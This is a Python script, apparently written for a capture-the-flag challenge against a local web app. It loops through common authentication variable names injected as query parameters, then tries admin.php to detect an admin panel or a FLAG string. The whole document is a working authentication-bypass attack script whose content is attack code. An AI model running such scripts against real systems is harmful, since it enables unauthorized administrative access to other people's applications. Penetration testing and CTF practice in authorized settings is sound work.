import requests
import re

url = "http://127.0.0.1:33107"
session_cookie = None

def test_auth_bypass(var_name, var_value):
    global session_cookie
    
    print(f"\n{'='*60}")
    print(f"Testing: {var_name}={var_value}")
    print(f"{'='*60}")
    
    # Create session to maintain cookies
    session = requests.Session()
    
    # First, inject via category parameter
    inject_url = f"{url}/index.php?category=secret&{var_name}={var_value}"
    try:
        inject_resp = session.get(inject_url, timeout=10)
        print(f"Injection response status: {inject_resp.status_code}")
        print(f"Injection response length: {len(inject_resp.text)} chars")
        
        # Check if injection set any cookies
        if inject_resp.cookies:
            print(f"Cookies after injection: {dict(inject_resp.cookies)}")
            
    except Exception as e:
        print(f"Injection failed: {e}")
        return False, None
    
    # Then try to access admin.php
    admin_url = f"{url}/admin.php"
    try:
        admin_resp = session.get(admin_url, timeout=10)
        print(f"Admin access status: {admin_resp.status_code}")
        print(f"Admin page length: {len(admin_resp.text)} chars")
        
        # Print first 500 chars to see content
        print(f"Admin page preview:\n{admin_resp.text[:500]}")
        
        # Check for admin UI elements
        if "Welcome" in admin_resp.text or "Panel" in admin_resp.text:
            print(f"✅ SUCCESS: Admin panel accessible after injecting {var_name}!")
            return True, admin_resp.text
        
        # Check for flag patterns
        flag_match = re.search(r'FLAG\{[^}]+\}', admin_resp.text, re.IGNORECASE)
        if flag_match:
            print(f"🚩 FLAG FOUND: {flag_match.group()}")
            return True, admin_resp.text
        
        # Update session cookie if changed
        if admin_resp.cookies:
            session_cookie = list(admin_resp.cookies.keys())[0]
            print(f"Session cookie: {session_cookie}")
            
    except Exception as e:
        print(f"Admin access failed: {e}")
        
    return False, None

# Common authentication variables to test
test_vars = [
    ('admin', 1),
    ('is_admin', 'true'),
    ('logged_in', 1),
    ('user', 'admin'),
    ('username', 'admin'),
    ('user_type', 'admin'),
    ('auth', 1),
    ('authorized', 1),
    ('authenticated', 1),
    ('role', 'admin')
]

results = []

for var_name, var_value in test_vars:
    success, content = test_auth_bypass(var_name, var_value)
    results.append({
        'variable': var_name,
        'success': success,
        'content': content
    })
    
    if success:
        break  # Stop on first success

# Summary
print(f"\n{'='*60}")
print("TEST SUMMARY")
print(f"{'='*60}")
success_count = sum(1 for r in results if r['success'])
print(f"Total tests: {len(results)}")
print(f"Successful auth bypasses: {success_count}")

for r in results:
    status = "✅ SUCCESS" if r['success'] else "❌ FAILED"
    print(f"{status}: {r['variable']}")

if success_count == 0:
    print("\n⚠️  No variables successfully bypassed authentication")
else:
    print(f"\n🎯 Found {success_count} variable(s) that may affect authentication")
